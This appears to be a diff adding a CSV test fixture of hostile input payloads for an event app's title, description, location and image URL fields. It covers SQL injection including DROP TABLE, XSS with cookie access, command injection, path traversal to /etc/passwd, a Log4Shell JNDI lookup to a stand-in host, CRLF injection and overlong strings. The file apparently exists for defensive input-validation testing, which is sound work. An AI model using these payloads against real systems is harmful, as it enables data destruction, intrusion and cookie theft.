@@ -1,0 +1,46 @@
+﻿category,target_field,payload
+SQL Injection,title,' OR '1'='1
+SQL Injection,title,admin'--
+SQL Injection,title,'; DROP TABLE Events;--
+SQL Injection,title,' OR SLEEP(5)--
+SQL Injection,title,' UNION SELECT NULL--
+SQL Injection,title,') OR ('1'='1
+SQL Injection,description,' OR '1'='1
+SQL Injection,description,'; DROP TABLE Events;--
+SQL Injection,description,' OR SLEEP(5)--
+SQL Injection,location,' OR 1=1--
+SQL Injection,location,'; DROP TABLE Events;--
+SQL Injection,imageUrl,' OR '1'='1
+XSS,title,<script>alert(1)</script>
+XSS,title,<img src=x onerror=alert(1)>
+XSS,title,<svg onload=alert(1)>
+XSS,title,<body onload=alert(1)>
+XSS,title,<iframe src=javascript:alert(1)>
+XSS,title,<details open ontoggle=alert(1)>
+XSS,title,javascript:alert(1)
+XSS,description,<script>alert(document.cookie)</script>
+XSS,description,<img src=x onerror=alert(1)>
+XSS,location,<svg/onload=alert(1)>
+XSS,location,<script>alert(1)</script>
+XSS,imageUrl,javascript:alert(1)
+XSS,imageUrl,"""><script>alert(1)</script>"
+NoSQL Injection,title,{$ne: null}
+NoSQL Injection,description,[$gt]=
+LDAP Injection,title,*)(uid=*
+Path Traversal,title,../../../../etc/passwd
+Path Traversal,imageUrl,../../../../etc/passwd
+Path Traversal,location,....//....//etc/passwd
+Command Injection,title,; ls -la
+Command Injection,description,| whoami
+Command Injection,location,$(whoami)
+Template Injection,title,${7*7}
+Template Injection,description,<%= 7*7 %>
+Log4Shell,title,${jndi:ldap://evil.local/a}
+Log4Shell,imageUrl,${jndi:ldap://evil.local/a}
+CRLF Injection,title,admin%0d%0aSet-Cookie: x=1
+CRLF Injection,location,test%0d%0aX-Injected: true
+Null Byte,title,event%00
+Homoglyph,title,Tіtlе with Cyrillic look-alikes
+Length,title,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Length,description,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+Empty,title,
